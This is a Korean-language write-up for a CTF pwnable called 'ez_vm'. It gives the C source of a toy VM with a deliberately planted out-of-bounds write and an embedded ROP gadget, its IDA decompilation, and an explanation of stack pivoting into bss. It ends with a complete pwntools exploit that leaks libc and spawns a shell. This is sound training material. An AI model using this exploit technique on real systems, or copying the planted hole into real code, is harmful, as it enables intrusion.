# README.md

# ez_vm

# Usage

# Concept

- OOB, Stack pivoting

# Writeup

일단 소스코드는 아래와 같다.

```c
//gcc -O0 -fno-stack-protector -no-pie -o ez_vm vm.c

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define NUM_REGISTERS 4
#define MOV 1
#define LOAD 2
#define STORE 3
char check=0;

typedef struct {
    int registers[NUM_REGISTERS];
} VM;

typedef struct {
    unsigned char opcode;
    unsigned char param1;
    unsigned int param2;
} Instruction;
void nope() {
    asm(" ret;");
}
__asm__ (
    "push %rdi\n"
    "pop %rdi\n"
    "ret\n"        
);

void init() {
setvbuf(stdin, 0, 2, 0);
setvbuf(stdout, 0, 2, 0);
}

void init_vm(VM *vm) {
    memset(vm->registers, 0, sizeof(vm->registers));
}

void execute(VM *vm, int *memory, Instruction *Inst) {
    switch (Inst->opcode) {
        case MOV:

            if (Inst->param1>=4) break;
            vm->registers[Inst->param1] = Inst->param2;
            break;
        case LOAD:
            if (Inst->param1>=4) break;
            if (Inst->param2>=2) break;
            vm->registers[Inst->param1] = memory[Inst->param2];
            break;
        case STORE:

            if (Inst->param2>=4) break;
            if (Inst->param1>5) break;
            if ((Inst->param1==5)&&check) break;
            memory[Inst->param1] = vm->registers[Inst->param2];
            check=1;
            break;
        default:

    }
}
int i=0;
VM vm;
int main() {
    init();
    int memory[2];
    memset(memory,0,8);
    init_vm(&vm);

    char program[0x100];
    puts("opcode: ");
    memset(program,0,0x100);
    i=0;

    read(0,program,0x100);
    

    while(program[i]){
        execute(&vm,memory,&program[i]);
        i+=8;
    }

    return 0;
}
```

ida로 보면 아래와 같다.

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  char buf[264]; // [rsp+0h] [rbp-110h] BYREF
  char s[8]; // [rsp+108h] [rbp-8h] BYREF

  sub_4011A5(a1, a2, a3);
  memset(s, 0, sizeof(s));
  sub_4011EC(&unk_404080);
  puts("opcode: ");
  memset(buf, 0, 0x100uLL);
  dword_404074 = 0;
  read(0, buf, 0x100uLL);
  while ( buf[dword_404074] )
  {
    sub_401215(&unk_404080, s, &buf[dword_404074]);
    dword_404074 += 8;
  }
  return 0LL;
}
```

main함수에는 취약점이 없다.

buf에 opcode를 0x100 바이트 입력을 받고 sub_401215를 실행한다. 4011A5나 4011EC같은 경우 그냥 init 함수들이다.  sub_401215 이 함수를 따라가보자.

```c
__int64 __fastcall sub_401215(__int64 a1, __int64 a2, unsigned __int8 *a3)
{
  __int64 result; // rax

  result = *a3;
  if ( (_DWORD)result == 3 )
  {
    result = *((unsigned int *)a3 + 1);
    if ( (unsigned int)result <= 3 )
    {
      result = a3[1];
      if ( (unsigned __int8)result <= 5u )
      {
        if ( a3[1] != 5 || (result = (unsigned __int8)byte_404070, !byte_404070) )
        {
          result = *(unsigned int *)(a1 + 4LL * *((unsigned int *)a3 + 1));
          *(_DWORD *)(a2 + 4LL * a3[1]) = result;
          byte_404070 = 1;
        }
      }
    }
  }
  else if ( *a3 <= 3u )
  {
    if ( (_DWORD)result == 1 )
    {
      result = a3[1];
      if ( (unsigned __int8)result <= 3u )
      {
        result = a1;
        *(_DWORD *)(a1 + 4LL * a3[1]) = *((_DWORD *)a3 + 1);
      }
    }
    else if ( (_DWORD)result == 2 )
    {
      result = a3[1];
      if ( (unsigned __int8)result <= 3u )
      {
        result = *((unsigned int *)a3 + 1);
        if ( (unsigned int)result <= 1 )
        {
          result = a1;
          *(_DWORD *)(a1 + 4LL * a3[1]) = *(_DWORD *)(4LL * *((unsigned int *)a3 + 1) + a2);
        }
      }
    }
  }
  return result;
}
```

opcode = 1이면 전역변수에 특정 값을 넣을 수 있고, opcode = 3이면 2번째 인자 (위의 s에 해당)에서 인덱스를 통해 전역변수에 있는 값을 넣을 수 있는 것을 확인할 수 있다.

이 때, 1번은 5까지 그 이후로는 4까지 인덱스를 사용할 수 있다는 것을 확인할 수 있다.

main함수에서 s는 int s[2]였던 것을 생각하면 여기서 OOB가 일어나 sfp와 ret을 덮을 수 있다는 것을 알 수 있다.

sfp와 ret을 덮을 수 있는 취약점만으로 어떻게 익스할 수 있을까?

main함수의   read(0, buf, 0x100uLL); 를 이용하면 된다.

sfp를 w권한이 있는 bss영역으로 덮은 다음, ret에  저 주소를 넣으면 rbp-0x110에 입력하기 때문에 bss에 fake stack을 만들 수 있으며, read(0, buf, 0x100uLL); 아래에         execute(&vm,memory,&program[i]); 가 있기에, sfp 와 ret을 덮을 수 있는 취약점을 여러번 사용할 수 있다.

또한 read를 통해서 opcode를 입력하는 부분에서 sfp와 ret을 덮는 부분 이후에 값을 쓸 수 있는데, 이를 이용하여 rop를 할 수 있다.

pop rdi, puts_got, puts_plt를 이용하면 puts의 주소를 leak해서 libc_leak이 가능해진다.

그다음 앞의 동작과 유사하게 반복하여 pop rdi, binsh, ret, system 을 이용하여 쉘이 따진다.

 ex.py

```python
from pwn import *
#context.log_level="debug"
puts_plt = 0x401070
puts_got = 0x404018
pop_rdi = 0x00000000004011a3
m= 0x00000000004013b4
bss= 0x0000000000404000
ret=0x000000000040101a
#p=process("./ez_vm")
p=remote("0.0.0.0",31337)
e=ELF("./ez_vm")
libc=ELF("libc.so.6")
pause()
p.recvuntil("opcode: ")

def mov(a,b): # reg[a]=b
    s=b"\x01"
    s+= a.to_bytes(1, byteorder='little')
    s+=b"\x00\x00"
    s+= b.to_bytes(4, byteorder='little')
    
    return s
def store(a,b): # memory[a]=reg[b]
    s=b"\x03"
    s+= a.to_bytes(1, byteorder='little')
    s+=b"\x00\x00"
    s+= b.to_bytes(4, byteorder='little')
    return s
def bug(off1,ret_addr):
    
    c=mov(0,bss+off1)
    c+=store(2,0)
    c+=mov(1,ret_addr)
    c+=store(4,1)
    c=c.ljust(0x70,b"\x00")
    return c
payload=mov(1,0)
payload+=store(5,1)
payload+=bug(0x700,m)
payload+=p64(puts_got)
payload+=p64(puts_plt)
payload+=p64(m)
p.send(payload)
sleep(1)

payload=bug(0x650,m)
payload+=p64(puts_got)
payload+=p64(puts_plt)
payload+=p64(m)
p.send(payload)
sleep(1)

payload=bug(0x900,pop_rdi)
p.send(payload)
p.recvline()
leak=p.recvline().rstrip()
libc.address=u64(leak.ljust(8,b"\x00"))-libc.symbols["puts"]
print("libc_base: ",hex(libc.address))
payload=bug(0x850,m)
payload+=p64(next(libc.search(b'/bin/sh')))
payload+=p64(ret)
payload+=p64(libc.symbols["system"])
sleep(1)
p.send(payload)
sleep(1)
payload=bug(0x700,pop_rdi)
p.send(payload)

p.interactive()

```